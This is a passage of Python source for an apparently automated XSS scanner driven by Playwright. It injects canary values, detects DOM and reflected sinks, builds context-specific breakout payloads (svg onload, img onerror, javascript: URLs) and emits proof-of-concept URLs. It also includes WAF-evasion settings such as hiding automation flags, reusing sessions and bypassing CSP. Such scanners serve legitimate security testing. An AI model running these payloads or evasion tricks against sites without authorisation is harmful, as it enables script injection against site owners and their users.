from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
import os
import re
import signal
import threading
from lxml import html as lxml_html
import argparse
from queue import Queue
import sys
import yaml

config = yaml.safe_load(open('config.yaml'))
preloadjs = ""
injectjs = ""
stage1_wait = 0

import hashlib
import time
import logging

# Playwright runs its protocol transport on an asyncio loop. When the watchdog
# SIGKILLs a hung worker's Node driver, that worker's loop keeps flushing its
# buffered writes to the now-dead pipe and asyncio logs a WARNING per write
# ("pipe closed by peer or os.write(pipe, data) raised exception.") — ~45 lines
# per kill. It's expected fallout of an intentional teardown, so drop just that
# message to keep the real log readable (other asyncio warnings still show).
class _DropPipeClosedWarning(logging.Filter):
    def filter(self, record):
        return 'pipe closed by peer' not in record.getMessage()

logging.getLogger('asyncio').addFilter(_DropPipeClosedWarning())

WORKER_TIMEOUT = 60  # seconds
BROWSER_REFRESH_INTERVAL = 50   # URLs per browser before recycle
DRIVER_REFRESH_INTERVAL = 100   # URLs per playwright Node.js driver before full restart
worker_state = {}  # wid -> {'last': float, 'browser': Browser}
worker_state_lock = threading.Lock()

domain_sinks = {}
domain_sinks_lock = threading.Lock()

domain_reflected = {}
domain_reflected_lock = threading.Lock()

DOMAIN_MAX_ERRORS = 10
domain_errors = {}
domain_errors_lock = threading.Lock()

output_file = None
output_lock = threading.Lock()
debug_mode = False
dedup = False
extra_headers = {}
# Path to a Playwright storage_state JSON (cookies + localStorage) captured from
# a real, WAF-passed session. When set, every context loads it and cookies are
# NOT cleared between URLs (clearing would drop the anti-bot cookie).
storage_state_path = None
# Run browsers visibly (needs a display). Headed Chromium drops the
# "HeadlessChrome" client-hint brand, which some WAFs block on — and it matches
# the fingerprint of a session captured with --capture-session.
headed = False
# Fixed viewport {'width': W, 'height': H} from --viewport (e.g. mobile 430x932).
# None keeps Playwright's default (1280x720).
viewport = None


def is_closed_error(e):
    msg = str(e)
    return ('has been closed' in msg
            or 'Target closed' in msg
            or 'Browser closed' in msg
            or 'Connection closed' in msg)


def pid_alive(pid):
    """True if the process exists. Used by the watchdog to catch a dead Node
    driver (OOM/crash/broken pipe) fast — a worker blocked on a dead driver
    never raises (asyncio drops the writes silently), so without this it only
    recovers on the 60s hang timeout."""
    if not pid:
        return False
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    except Exception:
        return True


def kill_node_driver(pid):
    """SIGKILL the playwright node driver subprocess. Called from the watchdog
    thread instead of Browser.close() — close() can't safely run off the
    worker's playwright-bound thread and silently leaks the driver (and its
    Chromium child) when the worker is hung. Chromium sets PR_SET_PDEATHSIG,
    so killing node cascades to its Chromium child via the kernel."""
    if not pid:
        return
    try:
        os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        pass
    except Exception as e:
        print(f"[watchdog] kill node pid {pid}: {e}", file=sys.stderr)


def domain_is_blocked(domain):
    with domain_errors_lock:
        return domain_errors.get(domain, 0) >= DOMAIN_MAX_ERRORS


def domain_record_error(domain):
    with domain_errors_lock:
        domain_errors[domain] = domain_errors.get(domain, 0) + 1
        return domain_errors[domain]


# Sinks that only ever ride along with the page's own URL — the canary in
# their value came from location, so no attacker-controlled source flowed in.
# location_* are exempt on purpose (open-redirect leads), JS sinks and
# script_text can't be a pure URL copy. (Literal set: JS_SINKS is defined
# further down; keep the two in sync.)
NOISE_EXEMPT_SINKS = {'eval', 'func', 'setTimeout', 'setInterval', 'script_text',
                      'location_nav', 'location_assign', 'location_replace',
                      'location_href'}


def filter_noise_sinks(sinks, current_url='', dom_url=None):
    """Drop URL-copy sinks: share widgets, trackers, captcha/embed href
    params — values that embed the page's own URL. Signal: there the canary
    sits MID-URL, immediately followed by query/fragment continuation
    (`&`, `#`, or their percent-encoded forms), because the page glued its
    full location into a bigger URL. Genuine flows have the canary
    free-standing or at a value end (breakout-capable), so they survive.
    For pure URL-attribute sinks (a_href, *_src, ...) a value-end canary is
    also noise — no markup to break out of — UNLESS the canary starts the
    whole value (full-value control => javascript: URL possible => keep).
    Analysis runs on once-unquoted code so single- and double-encoded
    embeds normalize to the same shape."""
    if not sinks:
        return list(sinks)
    canary = config['canary']
    rgx = re.compile(canary + r'[a-zA-Z0-9_.\[\]\-]+')
    kept = []
    for s in sinks:
        if s.get('sink') in NOISE_EXEMPT_SINKS:
            kept.append(s)
            continue
        decoded = unquote(s.get('code') or '')
        url_attr = s['sink'] in {'a_href', 'image_src', 'script_src',
                                 'iframe_src', 'form_action'}
        if s['sink'].startswith('setAttribute_'):
            attr = s['sink'].split('_', 2)[2] if s['sink'].count('_') >= 2 else ''
            url_attr = attr in ('href', 'src', 'action', 'formaction', 'content')
        if url_attr and decoded.lstrip().lstrip('<').startswith(canary):
            kept.append(s)  # full-value control — javascript: URL candidate
            continue
        occ = []
        for m in rgx.finditer(decoded):
            before = decoded[:m.start()]
            tail = decoded[m.end():]
            # skip the wrapped canary's closing `>` (raw or %3E)
            if tail.startswith('>'):
                tail = tail[1:]
            elif tail[:3].lower() == '%3e':
                tail = tail[3:]
            if url_attr:
                # for URL-attribute sinks only query position can be noise:
                # canary in path/authority/fragment of the resolved value
                # means the page assigned (nearly) the whole value —
                # attacker-controlled, e.g. `a.href = <rivalsssinput>`
                # resolving to a path. `?` must be the last URL separator
                # before the canary for it to sit inside the query.
                q, h = before.rfind('?'), before.rfind('#')
                if q == -1 or (h != -1 and h > q):
                    occ.append('free')
                    continue
            # mid: more query params follow (`&x=` or encoded forms). A bare
            # `&` without `name=` (HTML entities like `&nbsp;`) is NOT
            # continuation — that's markup after a free-standing value.
            if (re.match(r'&[A-Za-z0-9_.%\-]+(?:=|%3D)', tail, re.I)
                    or tail[:3].lower() in ('%26', '%23')
                    or tail.startswith('#')):
                occ.append('mid')
            elif (tail.startswith(('"', "'", '>', '%22', '%27', '%3e', '%3E'))
                    or tail == ''):
                # value end: ambiguous for markup sinks (breakout-capable),
                # plain noise for url-attr sinks (nothing to break out of)
                occ.append('mid' if url_attr else 'end')
            else:
                occ.append('free')
        # noise only when every occurrence rides inside an embedded URL
        # (mid-param or its tail end) and none is free-standing markup
        if 'mid' in occ and 'free' not in occ:
            continue
        kept.append(s)
    return kept


def filter_new_sinks(domain, sinks, current_url=''):
    """Return only sinks not yet seen for this domain. Hashes sink+sources+code,
    with the current URL (raw and URL-encoded) stripped from code first."""
    if not sinks:
        return []
    if not dedup:
        return list(sinks)
    new = []
    url_enc = quote(current_url, safe='') if current_url else ''
    with domain_sinks_lock:
        seen = domain_sinks.setdefault(domain, set())
        for s in sinks:
            code = s.get('code') or ''
            if current_url:
                code = code.replace(current_url, '').replace(url_enc, '')
            payload = s.get('sink', '') + '|' + ','.join(sorted(s.get('sources', []))) + '|' + code
            h = hashlib.md5(payload.encode('utf-8', 'replace')).hexdigest()
            if h not in seen:
                seen.add(h)
                new.append(s)
    return new

def filter_new_reflected(domain, reflected):
    """Return only reflected hits not yet seen for this domain. Hashes
    key+context+tag+attr."""
    if not reflected:
        return []
    if not dedup:
        return list(reflected)
    new = []
    with domain_reflected_lock:
        seen = domain_reflected.setdefault(domain, set())
        for r in reflected:
            keys = r.get('key', '')
            if isinstance(keys, list):
                keys = ','.join(sorted(keys))
            payload = '|'.join([
                keys,
                r.get('context', ''),
                r.get('tag', ''),
                r.get('attr', ''),
            ])
            h = hashlib.md5(payload.encode('utf-8', 'replace')).hexdigest()
            if h not in seen:
                seen.add(h)
                new.append(r)
    return new


def find_reflected_canaries(raw_html, canary):
    results = []
    rgx = re.compile(canary + r'([a-zA-Z0-9_.\[\]\-]+)')
    tree = lxml_html.fromstring(raw_html)

    def _snippet(element):
        try:
            s = lxml_html.tostring(element, encoding='unicode', with_tail=False)
        except Exception:
            return ''
        s = re.sub(r'\s+', ' ', s).strip()
        return s[:300]

    for el in tree.iter():
        tag = el.tag if isinstance(el.tag, str) else ''

        # tag name itself matches canary — `<canary+key>` was reflected
        # unescaped into HTML body and parsed as an unknown empty element.
        keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(tag)))
        if keys:
            parent = el.getparent()
            parent_tag = parent.tag if (parent is not None and isinstance(parent.tag, str)) else 'html'
            results.append({'key': keys, 'context': 'html', 'tag': parent_tag,
                            'code': _snippet(parent if parent is not None else el)})

        # check text and tail
        for text in (el.text, el.tail):
            if not text:
                continue
            keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(text)))
            if keys:
                ctx = 'script' if tag == 'script' else 'style' if tag == 'style' else 'html'
                results.append({'key': keys, 'context': ctx, 'tag': tag, 'code': _snippet(el)})

        # check attributes
        for attr_name, attr_val in el.attrib.items():
            if not attr_val:
                continue
            keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(attr_val)))
            if keys:
                results.append({'key': keys, 'context': 'attr', 'tag': tag, 'attr': attr_name, 'code': _snippet(el)})

    return results


def get_reflected_payloads(reflected, canary):
    """Generate confirmation payloads for server-side reflected canaries."""
    # Dedup by (key, ctx_group) so each key gets at most one html/attr payload
    # AND one script payload. The two classes need different payloads: script
    # contexts JSON-escape " to \" (breaking onload="..."), while html/attr
    # contexts do not.
    seen = set()
    results = []
    for r in reflected:
        keys = r.get('key') or []
        if isinstance(keys, str):
            keys = [keys]
        ctx = r.get('context', 'html')
        ctx_group = 'script' if ctx == 'script' else 'other'
        for key in keys:
            dedup_key = (key, ctx_group)
            if not key or dedup_key in seen:
                continue
            seen.add(dedup_key)
            if ctx == 'script':
                # " gets JSON-escaped to \" inside <script> JSON blobs, making
                # onload="..." a JS syntax error. Use single-quoted attribute +
                # this.id so no " appears in the event handler.
                payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg id={key} onload=rsjsstorage.alertfunc(this.id)>"
            else:
                payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=\"rsjsstorage.alertfunc('{key}')\">"
            results.append({'key': key, 'sink': 'reflected_' + ctx, 'ctx': 'html', 'payload': payload})
    return results


def build_dom_url(current_url, usp_revealed, canary):
    """Append revealed USP keys (not already present in the query) to the
    current URL as `key=canary+key` pairs."""
    if not usp_revealed:
        return current_url
    parsed = urlparse(current_url)
    existing = set(parse_qs(parsed.query, keep_blank_values=True).keys())
    extra = [(k, canary + k) for k in usp_revealed if k not in existing]
    if not extra:
        return current_url
    extra_query = urlencode(extra)
    new_query = parsed.query + '&' + extra_query if parsed.query else extra_query
    return urlunparse(parsed._replace(query=new_query))


JS_SINKS = {'eval', 'func', 'setTimeout', 'setInterval', 'script_text'}
URL_SINKS = {'location_assign', 'location_replace', 'location_href', 'location_nav', 'a_href', 'form_action', 'iframe_src', 'script_src', 'window_open'}
HTML_SINKS = {'html'}

JS_PAYLOADS = {
    'expr':     "rsjsstorage.alertfunc('{key}');",
    'single':   "'-rsjsstorage.alertfunc(\"{key}\")-'",
    'double':   "\"-rsjsstorage.alertfunc('{key}')-\"",
    'backtick': "`-rsjsstorage.alertfunc('{key}')-`",
}


def detect_js_context(code, canary, key):
    """Determine if canary+key sits inside a string literal in JS code.
    Counts unescaped quotes before the marker — odd count means we're inside.
    Returns: 'expr' | 'single' | 'double' | 'backtick'
    """
    marker = canary + key
    idx = code.find(marker)
    if idx == -1:
        return 'expr'
    before = code[:idx]
    for qchar, name in (('"', 'double'), ("'", 'single'), ('`', 'backtick')):
        count = 0
        i = 0
        while i < len(before):
            if before[i] == '\\':
                i += 2
                continue
            if before[i] == qchar:
                count += 1
            i += 1
        if count % 2 == 1:
            return name
    return 'expr'


def detect_html_context(code, canary, key):
    """Determine the attribute-value quoting context of canary+key in HTML code.
    The HTML5 parser's 'before attribute value state' treats the first character
    after `=` as the delimiter: `"` → double-quoted, `'` → single-quoted,
    anything else → unquoted.  The universal payload `'">…` starts with `'`,
    which *opens* a single-quoted value in the unquoted case and swallows the
    entire attack.  Returns the right context so get_payloads can pick a
    matching breakout.
    Returns: 'unquoted' | 'single' | 'double' | 'text'
    """
    marker = canary + key
    idx = code.find(marker)
    if idx == -1:
        return 'text'
    start = idx
    # rsCanaryValue wraps values in <canary+key> — skip the opening `<`
    if start > 0 and code[start - 1] == '<':
        start -= 1
    j = start - 1
    while j >= 0 and code[j] in ' \t\n\r':
        j -= 1
    if j < 0:
        return 'text'
    if code[j] == '=':
        return 'unquoted'
    if code[j] in ('"', "'"):
        q = code[j]
        k = j - 1
        while k >= 0 and code[k] in ' \t\n\r':
            k -= 1
        if k >= 0 and code[k] == '=':
            return 'double' if q == '"' else 'single'
    return 'text'


def is_url_exploitable(code, canary, key):
    """Check if canary+key controls the full URL or the domain part.
    Returns True if code starts with canary+key, or canary is in the
    netloc of a parsed URL in code."""
    marker = canary + key
    stripped = code.lstrip().lstrip('<')
    if stripped.startswith(marker):
        return True
    try:
        parsed = urlparse(stripped)
        if parsed.netloc and canary in parsed.netloc:
            return True
    except Exception:
        pass
    return False


URL_ATTR_NAMES = ('href', 'src', 'action', 'formaction')


def static_confirm_url_sinks(new_sinks, payloads, canary):
    """For URL sinks where canary+key controls the URL value (start or netloc),
    return the matching payload entries so they can be marked confirmed without
    waiting on stage 2 (which can't auto-click <a>/<form>)."""
    confirmed = []
    for s in new_sinks:
        stype = s['sink']
        is_url_sink = stype in URL_SINKS
        is_url_attr = False
        if stype.startswith('setAttribute_'):
            parts = stype.split('_', 2)
            attr = parts[2] if len(parts) > 2 else ''
            is_url_attr = attr in URL_ATTR_NAMES
        if not (is_url_sink or is_url_attr):
            continue
        code = s.get('code', '')
        for key in s.get('sources', []):
            if not is_url_exploitable(code, canary, key):
                continue
            for p in payloads:
                if p['key'] == key and p['sink'] == stype:
                    confirmed.append(p)
                    break
    return confirmed


def get_payloads(sink, canary):
    """Generate payloads for a sink entry. Returns list of dicts with
    key, sink, ctx, payload."""
    stype = sink['sink']
    code = sink.get('code', '')
    results = []

    for key in sink.get('sources', []):
        if stype in JS_SINKS:
            ctx = detect_js_context(code, canary, key)
            payload = JS_PAYLOADS[ctx].format(key=key)
            results.append({'key': key, 'sink': stype, 'ctx': ctx, 'payload': payload})

        elif stype in URL_SINKS:
            results.append({'key': key, 'sink': stype, 'ctx': 'url',
                            'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})

        elif stype in HTML_SINKS:
            # createElement single-tag shape: code is exactly `<canary+key>`,
            # meaning a jQuery-style $(value) call hit the HTML branch of its
            # HTML-vs-selector heuristic on the wrapped canary (preload.js
            # wraps canaries in <…> on purpose). The confirmation payload must
            # ALSO start with '<' or the heuristic routes it to the selector
            # path at confirm time and nothing executes. No breakout prefix:
            # the canary was the whole fragment, not text inside markup.
            if code == f"<{canary}{key}>":
                results.append({'key': key, 'sink': stype, 'ctx': 'html',
                                'payload': f"<img/src/onerror=rsjsstorage.alertfunc('{key}')>"})
            else:
                html_ctx = detect_html_context(code, canary, key)
                if html_ctx == 'unquoted':
                    payload = f"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
                elif html_ctx == 'single':
                    payload = f"'></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
                elif html_ctx == 'double':
                    payload = f"\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
                else:
                    payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror=\"rsjsstorage.alertfunc('{key}')\">"
                results.append({'key': key, 'sink': stype, 'ctx': 'html', 'payload': payload})

        elif stype.startswith('setAttribute_'):
            # format: setAttribute_<tag>_<attr>
            parts = stype.split('_', 2)
            attr = parts[2] if len(parts) > 2 else ''
            if attr.startswith('on'):
                results.append({'key': key, 'sink': stype, 'ctx': 'event',
                                'payload': f"rsjsstorage.alertfunc('{key}')"})
            elif attr in ('href', 'src', 'action', 'formaction'):
                results.append({'key': key, 'sink': stype, 'ctx': 'url',
                                'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})

    return results


def build_inject_js(payloads):
    """Build preload_inject.js with payload_map {key: payload} filled in.
    _hash key is separated into hash_payload."""
    import json
    payload_map = {}
    hash_payload = ''
    for p in payloads:
        if p['key'] == '_hash':
            hash_payload = p['payload']
        else:
            payload_map[p['key']] = p['payload']
    js = injectjs
    js = js.replace('"{{payload_map}}"', json.dumps(payload_map))
    js = js.replace('"{{hash_payload}}"', json.dumps(hash_payload))
    return js


def build_payload_url(base_url, key, payload):
    """Build a PoC URL with `payload` substituted as the value of `key`.
    For key == '_hash', strips any existing fragment and appends `#<payload>` raw."""
    if key == '_hash':
        return base_url.split('#', 1)[0] + '#' + payload
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[key] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def emit_confirmed(base_url, confirmed):
    """Print confirmed PoC URLs to stdout, and append to output_file if set."""
    for c in confirmed:
        payload = c['payload'].replace('rsjsstorage.alertfunc', 'alert')
        poc = build_payload_url(base_url, c['key'], payload)
        line = f"{poc}  [sink={c['sink']} ctx={c['ctx']}]"
        print(line)
        if output_file is not None:
            with output_lock:
                output_file.write(line + '\n')


def process_url_stage2(context, url, payloads, heartbeat=None):
    """Stage 2: reload the same URL with canary params, but preload_inject.js
    returns payload values via USP hooks and hash."""
    beat = heartbeat or (lambda: None)
    if not payloads:
        return []
    inject_script = build_inject_js(payloads)
    url = inject_canary_params(url, config['canary'])
    has_hash_payload = any(p['key'] == '_hash' for p in payloads)
    target_url = url if has_hash_payload else url + f"#{config['canary']}_hash"

    page = context.new_page()
    page.add_init_script(script=inject_script)

    def stage2_route(route, request):
        try:
            if request.resource_type in BLOCKED_RESOURCE_TYPES:
                route.abort()
                return
        except Exception:
            pass
        try:
            route.continue_()
        except Exception:
            pass

    page.route("**/*", stage2_route)
    try:
        try:
            page.goto(target_url, timeout=10000, wait_until='commit')
        except PlaywrightTimeoutError:
            pass
        beat()
        expected = len(payloads)
        try:
            page.wait_for_function(
                f"() => window.rsjsstorage && window.rsjsstorage.jsEvals.length >= {expected}",
                # Heavy SPAs hydrate long after `commit`; the sink path (and the
                # alertfunc call) often fires seconds later. 1.5s systematically
                # under-confirmed; 5s covers hydration + late timers without
                # dominating scan time (stage 2 only runs on pages with sinks).
                timeout=5000,
            )
        except PlaywrightTimeoutError:
            pass
        beat()
        js_evals = page.evaluate("() => window.rsjsstorage ? window.rsjsstorage.jsEvals : null")
        confirmed = [p for p in payloads if p['key'] in (js_evals or [])]
        return confirmed
    except Exception as e:
        if is_closed_error(e):
            raise
        print(f"[stage2 error] {target_url} {e}", file=sys.stderr)
        return []
    finally:
        try:
            page.close()
        except Exception:
            pass


def process_url_stage2_reflected(context, base_url, payloads, heartbeat=None):
    """Confirm server-side reflected XSS by navigating with the payload as the
    raw query value (no JS hooks — the server has to be doing the reflection
    for execution to fire). Returns payloads whose key landed in jsEvals."""
    beat = heartbeat or (lambda: None)
    if not payloads:
        return []
    confirmed = []
    for p in payloads:
        beat()
        target_url = build_payload_url(base_url, p['key'], p['payload'])
        try:
            page = context.new_page()
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[stage2-reflected new_page] {target_url} {e}", file=sys.stderr)
            continue

        def stage2_route(route, request):
            try:
                if request.resource_type in BLOCKED_RESOURCE_TYPES:
                    route.abort()
                    return
            except Exception:
                pass
            try:
                route.continue_()
            except Exception:
                pass

        page.route("**/*", stage2_route)
        try:
            try:
                page.goto(target_url, timeout=10000, wait_until='commit')
            except PlaywrightTimeoutError:
                pass
            beat()
            try:
                page.wait_for_function(
                    "(k) => window.rsjsstorage && window.rsjsstorage.jsEvals.includes(k)",
                    arg=p['key'],
                    # Same rationale as process_url_stage2: SPA hydration and
                    # late timers need more than the previous 1.5s window.
                    timeout=5000,
                )
            except PlaywrightTimeoutError:
                pass
            js_evals = page.evaluate("() => window.rsjsstorage ? window.rsjsstorage.jsEvals : null") or []
            if p['key'] in js_evals:
                confirmed.append(p)
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[stage2-reflected error] {target_url} {e}", file=sys.stderr)
        finally:
            try:
                page.close()
            except Exception:
                pass
    return confirmed


def inject_canary_params(url, canary):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if params:
        # `<` + canary + key + `>` — matches rsCanaryValue() in preload.js so
        # jQuery's HTML-vs-text heuristic routes the value through innerHTML.
        injected = {k: ["<" + canary + k + ">"] for k in params}
        new_query = urlencode(injected, doseq=True)
        url = urlunparse(parsed._replace(query=new_query))
    return url


BLOCKED_RESOURCE_TYPES = {'image', 'media', 'font'}


def is_html_content_type(ct):
    """True if a main-document response with this Content-Type could be an
    HTML page Chromium renders and runs scripts in. 'text/html' also covers
    text/html-sandboxed via substring; the XML types cover XHTML payloads
    (rendered in XML mode). An EMPTY type counts too: Chromium sniffs
    unknown/absent types and may render HTML with scripts running, so the
    reflection scan still needs the body. The canary is unique, so scanning
    a non-HTML body can't false-positive."""
    ct = (ct or '').strip().lower()
    if not ct:
        return True
    return any(t in ct for t in ('text/html', 'application/xhtml+xml',
                                 'text/xml', 'application/xml'))


def process_url(context, url, heartbeat=None):
        beat = heartbeat or (lambda: None)
        url_domain = urlparse(url).netloc
        if domain_is_blocked(url_domain):
            return
        try:
            page = context.new_page()
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[{url_domain}] new_page: {e}", file=sys.stderr)
            return

        try:
            url = inject_canary_params(url, config['canary'])
            raw_body = []
            main_status = [None]
            main_non_html = [False]
            main_ct = ['']
            main_checked = [False]
            target_url = url + f"#{config['canary']}_hash"

            def capture_response(response):
                # First response matching the URL = the main document. Capture
                # its body for the reflection scan — see is_html_content_type
                # for what qualifies — or flag non-HTML so process_url omits
                # the URL after this first request. 3xx never decides either
                # way: the redirect chain continues to the real document (and
                # Playwright can't fetch redirect bodies anyway).
                if main_checked[0] or response.url.split('#')[0] != url:
                    return
                main_checked[0] = True
                main_status[0] = response.status
                main_ct[0] = response.headers.get('content-type', '')
                if 300 <= response.status < 400:
                    return
                if not is_html_content_type(main_ct[0]):
                    main_non_html[0] = True
                    return
                try:
                    raw_body.append(response.text())
                except Exception:
                    pass

            page.on("response", capture_response)

            # Capture canary-containing navigations at the network layer.
            # In Chromium, Location.{assign,replace,href} cannot be hooked from
            # JS (own non-configurable props on the location instance), so we
            # intercept here. The initial goto is allowed; any later main-frame
            # nav whose URL contains the canary is recorded as `location_nav`
            # and fulfilled with HTTP 204 — that keeps the browser on the
            # current page and preserves rsjsstorage (route.abort() instead
            # lands on chrome-error://chromewebdata/ and wipes it).
            target_url_no_hash = target_url.split('#', 1)[0]
            nav_sinks = []
            canary = config['canary']
            src_rgx = re.compile(canary + r'([a-zA-Z0-9_.\[\]\-]+)')

            def nav_route(route, request):
                try:
                    if request.resource_type in BLOCKED_RESOURCE_TYPES:
                        route.abort()
                        return
                    if (request.is_navigation_request()
                            and request.frame == page.main_frame
                            and request.url.split('#', 1)[0] != target_url_no_hash
                            and canary in request.url):
                        keys = list(dict.fromkeys(src_rgx.findall(request.url)))
                        nav_sinks.append({'sink': 'location_nav', 'sources': keys, 'code': request.url})
                        route.fulfill(status=204, body='')
                        return
                except Exception:
                    pass
                try:
                    route.continue_()
                except Exception:
                    pass

            page.route("**/*", nav_route)
            # Listen for all console logs
            # page.on("console", lambda msg: print(msg.text))
            try:
                page.goto(target_url, timeout=10000, wait_until='commit')
            except PlaywrightTimeoutError:
                pass
            beat()
            if main_non_html[0]:
                # The FIRST request came back non-HTML (JSON/PDF/plain text/
                # binary/...): no page JS ever runs, so there are no DOM sinks
                # to find and no reflection body was captured — the settle
                # wait, evaluate and any stage-2 requests are pure waste.
                # Omit the URL here. (SVG main documents are also omitted even
                # though scripts run there: verified empirically that sources
                # register, but in XML mode innerHTML with any HTML markup
                # THROWS, so the HTML-breakout confirmation payloads can never
                # execute — only pure JS sinks could confirm, which is
                # negligible on top of SVG-as-main-document being rare.)
                if debug_mode:
                    print(f"[skip non-html] {url} content-type={main_ct[0]!r} status={main_status[0]}", file=sys.stderr)
                if main_status[0] and main_status[0] >= 400:
                    print(f"[{url_domain}] main document {main_status[0]} for {url} "
                          f"(likely blocked/rate-limited — no findings possible)", file=sys.stderr)
                return
            # Post-commit settle: 'load' and 'domcontentloaded' never fire on
            # pages where the IIFE triggers a canary nav that we 204; waiting
            # on them costs the full timeout. networkidle is safer because the
            # 204 closes the request stream. Use stage1_wait when set,
            # otherwise a short 300 ms window for inline JS to run.
            if stage1_wait:
                try:
                    page.wait_for_load_state('networkidle', timeout=int(stage1_wait * 1000))
                except Exception:
                    pass
            else:
                page.wait_for_timeout(300)
            beat()
            # The target never actually loaded: a net-layer failure (connection
            # reset, cert error, DNS/unsafe port...) lands Chromium on
            # chrome-error://, and a 204'd initial nav leaves it on about:blank.
            # preload.js skips both, so rsjsstorage is absent — surface the
            # real reason instead of a misleading "no rsjsstorage" line.
            # (Ported back from mthook.js.)
            landed = page.url
            if landed.startswith('chrome-error://') or landed == 'about:blank':
                if debug_mode:
                    print(f"[load failed] {url} (no document committed)", file=sys.stderr)
                return
            rsjsstorage = page.evaluate("""() => {
                return window.rsjsstorage
            }""")

            if not rsjsstorage:
                print(f"[{url_domain}] no rsjsstorage (preload didn't run; page at {page.url})", file=sys.stderr)
                return

            current_url = rsjsstorage['originurl']
            domain = urlparse(current_url).netloc
            rsjsstorage['dom_url'] = build_dom_url(current_url, rsjsstorage.get('uspRevealed') or [], config['canary'])

            # check raw response for reflected canary with context
            new_reflected = []
            if raw_body:
                reflected = find_reflected_canaries(raw_body[0], config['canary'])
                new_reflected = filter_new_reflected(domain, reflected)
                if new_reflected:
                    rsjsstorage['reflected'] = new_reflected

            merged_sinks = (rsjsstorage.get('sinks') or []) + nav_sinks
            noise_before = len(merged_sinks)
            merged_sinks = filter_noise_sinks(merged_sinks, current_url, rsjsstorage.get('dom_url'))
            if debug_mode and len(merged_sinks) < noise_before:
                print(f"[noise] {url_domain}: dropped {noise_before - len(merged_sinks)} "
                      f"url-copy sink(s) on {current_url}", file=sys.stderr)
            new_sinks = filter_new_sinks(domain, merged_sinks, current_url)

            # Stage 2: generate payloads and verify execution
            payloads = []
            for s in new_sinks:
                payloads.extend(get_payloads(s, config['canary']))
            confirmed = []
            if payloads:
                static_confirmed = static_confirm_url_sinks(new_sinks, payloads, config['canary'])
                stage2_confirmed = process_url_stage2(context, url, payloads, heartbeat=beat)
                seen = set()
                for p in static_confirmed + stage2_confirmed:
                    k = (p['key'], p['sink'])
                    if k not in seen:
                        seen.add(k)
                        confirmed.append(p)

            # Stage 2 (reflected): server-side reflected XSS — navigate with
            # payload directly in the query and check for alertfunc execution.
            reflected_payloads = get_reflected_payloads(new_reflected, config['canary'])
            if reflected_payloads:
                # Skip keys already confirmed via a DOM sink — same PoC URL.
                confirmed_keys = {(c['key'], c['sink']) for c in confirmed}
                reflected_payloads = [p for p in reflected_payloads
                                      if not any(p['key'] == k[0] for k in confirmed_keys)]
                if reflected_payloads:
                    for p in process_url_stage2_reflected(context, url, reflected_payloads, heartbeat=beat):
                        confirmed.append(p)

            if confirmed:
                emit_confirmed(rsjsstorage['dom_url'], confirmed)

            # Surface WAF/error pages: a blocked doc has no sinks and reflects
            # nothing, so it's otherwise indistinguishable from a clean page.
            if main_status[0] and main_status[0] >= 400:
                print(f"[{url_domain}] main document {main_status[0]} for {url} "
                      f"(likely blocked/rate-limited — no findings possible)", file=sys.stderr)
            if debug_mode:
                if new_sinks or rsjsstorage.get('reflected'):
                    print({'originurl': rsjsstorage.get('originurl'), 'dom_url': rsjsstorage.get('dom_url'), 'uspRevealed': rsjsstorage.get('uspRevealed'), 'sinks': new_sinks, 'confirmed': confirmed, 'reflected': rsjsstorage.get('reflected')}, file=sys.stderr)
                else:
                    print(f"[no findings] {current_url} status={main_status[0]} "
                          f"(rsjsstorage ok, 0 sinks / 0 reflected)", file=sys.stderr)

        except Exception as r:
            if is_closed_error(r):
                raise
            count = domain_record_error(url_domain)
            print(f"[{url_domain} err {count}/{DOMAIN_MAX_ERRORS}] {r}", file=sys.stderr)
        finally:
            try:
                page.close()
            except Exception:
                pass


def worker(wid, queue: Queue, done_event: threading.Event):
    with worker_state_lock:
        worker_state.setdefault(wid, {'last': time.time(), 'node_pid': None})

    def heartbeat():
        # Called by process_url at each I/O milestone so the watchdog's
        # WORKER_TIMEOUT measures time-since-last-progress (a real hang), not
        # total URL processing time (which legitimately exceeds it on slow
        # pages with -w and multi-page stage-2 confirmation).
        with worker_state_lock:
            if wid in worker_state:
                worker_state[wid]['last'] = time.time()

    try:
        while True:  # outer: restart the playwright Node.js driver periodically
            restart_driver = False
            with sync_playwright() as p:
                try:
                    node_pid = p._impl_obj._connection._transport._proc.pid
                except Exception:
                    node_pid = None

                def launch_browser():
                    browser = p.chromium.launch(headless=not headed, args=[
                        # '--js-flags=--max-old-space-size=500',
                        # Drop navigator.webdriver — a cheap, well-known bot tell that
                        # some WAFs block on. (The HeadlessChrome client-hint brand is
                        # a separate, harder signal; reuse a real session via --session
                        # to get past WAFs that fingerprint deeper than this.)
                        '--disable-blink-features=AutomationControlled',
                        # '--disable-dev-shm-usage',
                        # '--disable-features=site-per-process,IsolateOrigins',
                        # '--disable-gpu',
                        # '--disable-software-rasterizer',
                        # '--disable-accelerated-2d-canvas',
                        # '--in-process-gpu',
                    ])
                    context = browser.new_context(
                        bypass_csp=True,
                        user_agent=config['ua'],
                        ignore_https_errors=True,
                        extra_http_headers=extra_headers or None,
                        storage_state=storage_state_path,
                        **({'viewport': viewport} if viewport else {}),
                    )
